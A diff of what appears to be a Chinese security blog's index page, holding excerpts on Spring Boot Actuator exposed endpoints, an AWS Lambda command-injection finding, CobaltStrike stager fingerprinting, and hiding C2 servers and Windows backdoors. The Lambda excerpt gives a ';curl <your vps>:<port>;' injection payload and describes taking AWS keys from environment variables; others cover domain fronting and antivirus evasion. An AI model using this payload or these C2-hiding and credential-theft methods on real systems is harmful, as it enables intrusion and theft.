@@ -117,6 +117,410 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/05/27/spring-boot-actuator.html" >Spring Boot Actuator漏洞复现</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-05-27  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01. 基本知识"></a>0x01. 基本知识</h3><ol>
+<li>在pom.xml里面有这样的配置</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;dependency&gt;
+   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
+   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;
+   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="2">
+<li>没有开启安全设置</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">management:
+  security:
+    enabled: false
+  health:
+    elasticsearch:
+      enabled: false
+  metrics:
+    export:
+      prometheus:
+        enabled: true
+      jmx:
+        enabled: true
+  endpoints:
+    web:
+      exposure:
+        include: &#39;*&#39;
+      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>服务端可以通过修改配置文件来改变Actuator的根路径：<code>management.endpoints.web.base-path=/monitor</code></p>
+<p>  搜索github的源代码，可以看到类似的设置：</p>
+<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>在配置不当的时候，可能暴露以下路由:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
+&#x2F;auditevents
+&#x2F;autoconfig
+&#x2F;beans
+&#x2F;caches
+&#x2F;conditions
+&#x2F;configprops
+&#x2F;docs
+&#x2F;dump
+&#x2F;env
+&#x2F;flyway
+&#x2F;health
+&#x2F;heapdump
+&#x2F;httptrace
+&#x2F;info
+&#x2F;intergrationgraph
+&#x2F;jolokia
+&#x2F;logfile
+&#x2F;loggers
+&#x2F;liquibase
+&#x2F;metrics
+&#x2F;mappings
+&#x2F;prometheus
+&#x2F;refresh
+&#x2F;scheduledtasks
+&#x2F;sessions
+&#x2F;shutdown
+&#x2F;trace
+&#x2F;threaddump
+&#x2F;actuator&#x2F;auditevents
+&#x2F;actuator&#x2F;beans
+&#x2F;actuator&#x2F;health
+&#x2F;actuator&#x2F;conditions
+&#x2F;actuator&#x2F;configprops
+&#x2F;actuator&#x2F;env
+&#x2F;actuator&#x2F;info
+&#x2F;actuator&#x2F;loggers
+&#x2F;actuator&#x2F;heapdump
+&#x2F;actuator&#x2F;threaddump
+&#x2F;actuator&#x2F;metrics
+&#x2F;actuator&#x2F;scheduledtasks
+&#x2F;actuator&#x2F;httptrace
+&#x2F;actuator&#x2F;mappings
+&#x2F;actuator&#x2F;jolokia
+&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2021/05/27/spring-boot-actuator.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01. 基本知识"></a>0x01. 基本知识</h3><ol>
+<li>在pom.xml里面有这样的配置</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;dependency&gt;
+   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
+   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;
+   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="2">
+<li>没有开启安全设置</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">management:
+  security:
+    enabled: false
+  health:
+    elasticsearch:
+      enabled: false
+  metrics:
+    export:
+      prometheus:
+        enabled: true
+      jmx:
+        enabled: true
+  endpoints:
+    web:
+      exposure:
+        include: &#39;*&#39;
+      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>服务端可以通过修改配置文件来改变Actuator的根路径：<code>management.endpoints.web.base-path=/monitor</code></p>
+<p>  搜索github的源代码，可以看到类似的设置：</p>
+<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>在配置不当的时候，可能暴露以下路由:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
+&#x2F;auditevents
+&#x2F;autoconfig
+&#x2F;beans
+&#x2F;caches
+&#x2F;conditions
+&#x2F;configprops
+&#x2F;docs
+&#x2F;dump
+&#x2F;env
+&#x2F;flyway
+&#x2F;health
+&#x2F;heapdump
+&#x2F;httptrace
+&#x2F;info
+&#x2F;intergrationgraph
+&#x2F;jolokia
+&#x2F;logfile
+&#x2F;loggers
+&#x2F;liquibase
+&#x2F;metrics
+&#x2F;mappings
+&#x2F;prometheus
+&#x2F;refresh
+&#x2F;scheduledtasks
+&#x2F;sessions
+&#x2F;shutdown
+&#x2F;trace
+&#x2F;threaddump
+&#x2F;actuator&#x2F;auditevents
+&#x2F;actuator&#x2F;beans
+&#x2F;actuator&#x2F;health
+&#x2F;actuator&#x2F;conditions
+&#x2F;actuator&#x2F;configprops
+&#x2F;actuator&#x2F;env
+&#x2F;actuator&#x2F;info
+&#x2F;actuator&#x2F;loggers
+&#x2F;actuator&#x2F;heapdump
+&#x2F;actuator&#x2F;threaddump
+&#x2F;actuator&#x2F;metrics
+&#x2F;actuator&#x2F;scheduledtasks
+&#x2F;actuator&#x2F;httptrace
+&#x2F;actuator&#x2F;mappings
+&#x2F;actuator&#x2F;jolokia
+&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2021/05/27/spring-boot-actuator.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/04/06/defense-from-c2.html" >防御性C2玩具尝试</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-04-06  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景需求"><a href="#背景需求" class="headerlink" title="背景需求"></a>背景需求</h3><p>不管一个什么形式的后门：定时任务、dll劫持、开机启动…，当我设置的后门运行的时候，我想掌握后门的启动时间、触发IP等上环境，所以这篇文章是在shellcode分离免杀的基础上做了尝试性扩展</p>
+<h4 id="考虑这样的场景："><a href="#考虑这样的场景：" class="headerlink" title="考虑这样的场景："></a>考虑这样的场景：</h4><ul>
+<li>后门被静态分析</li>
+<li>后门被动态分析</li>
+<li>shellcode被提取之后触发</li>
+<li>…</li>
+</ul>
+<p>在shellcode分离免杀的基础上扩展还是比较容易的，当客户端请求远程shellcode托管服务器的时候，增加一个机器人，然后发起一个上线通知：If This Then That，这样太简单了，我们再多加点料，比如：</p>
+<ol>
+<li>不带合理参数请求shellcode的URL时候，发起警告</li>
+<li>当木马运行在恶意环境的时候，发起警告<ul>
+<li>当木马上线IP不在服务端列表</li>
+<li>当木马上线主机的设备指纹不在服务端列表</li>
+</ul>
+</li>
+<li>shellcode托管服务随时可以关闭打开</li>
+<li>shellcode托管服务随时可以新增删除木马上线IP或者设备指纹</li>
+</ol>
+<h3 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h3><ul>
+<li>一台VPS：托管shellcode，通知slack机器人</li>
+<li>一个AWS账号隐藏C2（CloudFront）</li>
+<li>Slack：接收通知，使用<code>Slash commands</code>功能控制shellcode托管服务</li>
+</ul>
+<h5 id="托管shellcode流程"><a href="#托管shellcode流程" class="headerlink" title="托管shellcode流程"></a>托管shellcode流程</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p>
+	
+
+	</div>
+  <a type="button" href="/2021/04/06/defense-from-c2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景需求"><a href="#背景需求" class="headerlink" title="背景需求"></a>背景需求</h3><p>不管一个什么形式的后门：定时任务、dll劫持、开机启动…，当我设置的后门运行的时候，我想掌握后门的启动时间、触发IP等上环境，所以这篇文章是在shellcode分离免杀的基础上做了尝试性扩展</p>
+<h4 id="考虑这样的场景："><a href="#考虑这样的场景：" class="headerlink" title="考虑这样的场景："></a>考虑这样的场景：</h4><ul>
+<li>后门被静态分析</li>
+<li>后门被动态分析</li>
+<li>shellcode被提取之后触发</li>
+<li>…</li>
+</ul>
+<p>在shellcode分离免杀的基础上扩展还是比较容易的，当客户端请求远程shellcode托管服务器的时候，增加一个机器人，然后发起一个上线通知：If This Then That，这样太简单了，我们再多加点料，比如：</p>
+<ol>
+<li>不带合理参数请求shellcode的URL时候，发起警告</li>
+<li>当木马运行在恶意环境的时候，发起警告<ul>
+<li>当木马上线IP不在服务端列表</li>
+<li>当木马上线主机的设备指纹不在服务端列表</li>
+</ul>
+</li>
+<li>shellcode托管服务随时可以关闭打开</li>
+<li>shellcode托管服务随时可以新增删除木马上线IP或者设备指纹</li>
+</ol>
+<h3 id="准备材料"><a href="#准备材料" class="headerlink" title="准备材料"></a>准备材料</h3><ul>
+<li>一台VPS：托管shellcode，通知slack机器人</li>
+<li>一个AWS账号隐藏C2（CloudFront）</li>
+<li>Slack：接收通知，使用<code>Slash commands</code>功能控制shellcode托管服务</li>
+</ul>
+<h5 id="托管shellcode流程"><a href="#托管shellcode流程" class="headerlink" title="托管shellcode流程"></a>托管shellcode流程</h5><p><img src="/2021/04/06/defense-from-c2/18.png"></p>
+	
+	</div>
+  <a type="button" href="/2021/04/06/defense-from-c2.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/04/01/aws-lambda-rce.html" >Lambda远程命令执行测试</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-04-01  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
+<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
+cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>攻击的Payload： <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>，然后在自己服务器监听可以收到Lambda容器发起的请求。</p>
+<h5 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码:"></a>修复代码:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h3 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h3><ul>
+<li>Lambda函数代码路径: <code>/var/task</code></li>
+<li>用户凭证: 存储在环境变量里面，<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
+<li>文件系统: <code>/var/task</code>只读，<code>/tmp</code>可写</li>
+<li>默认用户: <code>sbx_userxxx</code></li>
+<li>Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右</li>
+<li>攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义</li>
+</ul>
+<p>在存在命令执行的情况下先获取用户凭证，然后使用<code>awscli</code>写入本地配置文件里面，通过<code>awscli</code>来操作，如果在创建<code>Lambda</code>的权限控制不足，这个时候就可以使用<code>awscli</code>来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。</p>
+<p>存在另外一种情况，当获取到的凭证权限很小的时候，到处都是<code>is not authorized to perform</code>，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：</p>
+	
+
+	</div>
+  <a type="button" href="/2021/04/01/aws-lambda-rce.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>测试的时候发现AWS的Lambda里面有这样的代码，可以很明显的看出来存在命令注入：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">execute_command <span class="token operator">=</span> <span class="token string">"ffmpeg -i "</span> <span class="token operator">+</span> video_url <span class="token operator">+</span> <span class="token string">" -y -f "</span> <span class="token operator">+</span> img_format <span class="token operator">+</span> <span class="token string">" -ss "</span> <span class="token operator">+</span> time_index <span class="token operator">+</span> <span class="token string">" -vframes 1 "</span> <span class="token operator">+</span> WH <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> output_path
+<span class="token keyword">print</span><span class="token punctuation">(</span>execute_command<span class="token punctuation">)</span>
+cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span>execute_command<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>攻击的Payload： <code>;curl &lt;your vps&gt;:&lt;port&gt;;</code>，然后在自己服务器监听可以收到Lambda容器发起的请求。</p>
+<h5 id="修复代码"><a href="#修复代码" class="headerlink" title="修复代码:"></a>修复代码:</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">cp <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"ffmpeg"</span><span class="token punctuation">,</span> <span class="token string">"-i"</span><span class="token punctuation">,</span> video_url<span class="token punctuation">,</span> <span class="token string">"-y"</span><span class="token punctuation">,</span> <span class="token string">"-f"</span><span class="token punctuation">,</span> img_format<span class="token punctuation">,</span> <span class="token string">"-ss"</span><span class="token punctuation">,</span> time_index<span class="token punctuation">,</span> <span class="token string">"-vframes"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> output_path<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<h3 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h3><ul>
+<li>Lambda函数代码路径: <code>/var/task</code></li>
+<li>用户凭证: 存储在环境变量里面，<code>AWS_ACCESS_KEY_ID</code>, <code>AWS_SECRET_ACCESS_KEY</code>, <code>AWS_SESSION_TOKEN</code></li>
+<li>文件系统: <code>/var/task</code>只读，<code>/tmp</code>可写</li>
+<li>默认用户: <code>sbx_userxxx</code></li>
+<li>Lambda计算的最大超时时间是15分钟，凭证过期时间是11个小时左右</li>
+<li>攻击Lambda只需要获取AK、SK、Token，反弹shell没什么意义</li>
+</ul>
+<p>在存在命令执行的情况下先获取用户凭证，然后使用<code>awscli</code>写入本地配置文件里面，通过<code>awscli</code>来操作，如果在创建<code>Lambda</code>的权限控制不足，这个时候就可以使用<code>awscli</code>来操作各种资源，比如我发现的命令执行有对主账户下所有网卡的操作权限，可以使用获取到的用户凭证删除所有网卡接口。</p>
+<p>存在另外一种情况，当获取到的凭证权限很小的时候，到处都是<code>is not authorized to perform</code>，可以通过以下查询来查看自己的凭证都什么权限，首先配置命令行工具：</p>
+	
+	</div>
+  <a type="button" href="/2021/04/01/aws-lambda-rce.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2021/01/04/CloudFront-find-cobaltstrike.html" >CobaltStrike的Stager特征隐藏</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-01-04  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p>
+<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
+<h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p>
+<h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p>
+<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p>
+	
+
+	</div>
+  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在github上面出现一个仓库分析<code>CobaltStrike</code>监听端口的特征：<a target="_blank" rel="noopener" href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>。CS在监听Stager端口的时候，会通过URI下载Payload执行，这个URI生成的规则生成：</p>
+<p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p>
+<h3 id="找到DomainFront"><a href="#找到DomainFront" class="headerlink" title="找到DomainFront"></a>找到DomainFront</h3><p>根据360的空间测绘，看完之后第一时间想到的是通过fofa这类空间测绘找出特征，然后找出来设置了DomainFront的C2，想看看这些C2<br>的原始域名和设置C2的域名是什么情况，大家都用的什么作为域名前置的 :)</p>
+<h4 id="Quake测绘"><a href="#Quake测绘" class="headerlink" title="Quake测绘"></a>Quake测绘</h4><p>根据360给出的搜索条件，先找出来一批IP地址:</p>
+<pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="修改脚本"><a href="#修改脚本" class="headerlink" title="修改脚本"></a>修改脚本</h4><p>修改好之后的脚本和扫描结果:<a target="_blank" rel="noopener" href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>。把单线程改为多线程，再增加一个获取IP的https证书域名函数：</p>
+	
+	</div>
+  <a type="button" href="/2021/01/04/CloudFront-find-cobaltstrike.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2020/09/10/redis-windows-hijack.html" >Redis On Windows -- Dll Hijack</a>
 		</h3>
 		</div>
@@ -193,402 +597,6 @@ C:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/08/28/CloudFront-Https.html" >Domain Fronting隐藏HTTPS</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-08-28  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p>
-<p>###目标</p>
-<ol>
-<li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li>
-<li>AWS的<code>Cloudfront</code>作为前置域名</li>
-</ol>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.com
-VPS(Centos)
-cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
-<h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p>
-<pre class="line-numbers language-none"><code class="language-none">yum install httpd
-systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
-&lt;VirtualHost *:80&gt;
-   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
-   ServerName example.com
-
-
-RewriteEngine on
-RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
-RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
-&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-
-	</div>
-  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>记录一下当使用<code>Domain Fronting</code>中使用<code>https</code>来上线时候的坑，因为查了半圈没有找到类似的资料，为啥非要https呢，因为<code>node32</code>对http的流量很敏感。</p>
-<p>###目标</p>
-<ol>
-<li>使用<code>Windows/beacon_https/reverse_https</code>作为上线的payload</li>
-<li>AWS的<code>Cloudfront</code>作为前置域名</li>
-</ol>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><pre class="line-numbers language-none"><code class="language-none">域名: example.com
-VPS(Centos)
-cloudflare(只作域名解析,不添加任何其他功能，不加CDN，不加HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-
-
-<h2 id="部署工作"><a href="#部署工作" class="headerlink" title="部署工作"></a>部署工作</h2><p>安装的apache是测试连通性，除此之外没有任何用处。</p>
-<pre class="line-numbers language-none"><code class="language-none">yum install httpd
-systemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<h4 id="增加apache配置文件"><a href="#增加apache配置文件" class="headerlink" title="增加apache配置文件"></a>增加apache配置文件</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf
-&lt;VirtualHost *:80&gt;
-   DocumentRoot &#x2F;var&#x2F;www&#x2F;html
-   ServerName example.com
-
-
-RewriteEngine on
-RewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.com
-RewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]
-&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-	
-	</div>
-  <a type="button" href="/2020/08/28/CloudFront-Https.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2020/08/28/hide-your-windows-backdoor.html" >Windows后门隐藏</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2020-08-28  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<h3 id="后门的构成"><a href="#后门的构成" class="headerlink" title="后门的构成"></a>后门的构成</h3><p>分为三个部分:</p>
-<ol>
-<li>shellcode的分离免杀</li>
-<li>C2服务器的隐藏</li>
-<li>Windows后门的设置</li>
-</ol>
-<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>shellcode的分离免杀有很多种，这里把每个模块拿出来就是如下的几个:</p>
-<ol>
-<li>通信: <code>socket</code>,<code>http</code></li>
-<li><code>shellcode</code>的执行方式</li>
-<li><code>shellcode</code>的流量</li>
-<li>远程服务器的隐藏</li>
-</ol>
-<p>除去第二种方式有很多种可以执行shellcode的，其他三种最好的解决方案是实用<code>Domain Fronting</code>隐藏服务器，AES动态加密解密运行shellcode。这样子既隐藏了服务器，又避免shellcode的明文流量被探测到。当然上线之后的操作被探测不在被讨论的范围之内。</p>
-<p>在参考资料里面,<code>uknownsec</code>已经把主要的代码放出来了。只需要拿出来拼凑一下就可以食用。</p>
-<p>其中服务端出去python的功能之外，可以给自己加上一个<code>slack</code>机器人的通知，这样子上线的时候就有通知。</p>
-<h4 id="C2服务器的隐藏"><a href="#C2服务器的隐藏" class="headerlink" title="C2服务器的隐藏"></a>C2服务器的隐藏</h4>
-	
-
-	</div>
-  <a type="button" href="/2020/08/28/hide-your-windows-backdoor.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
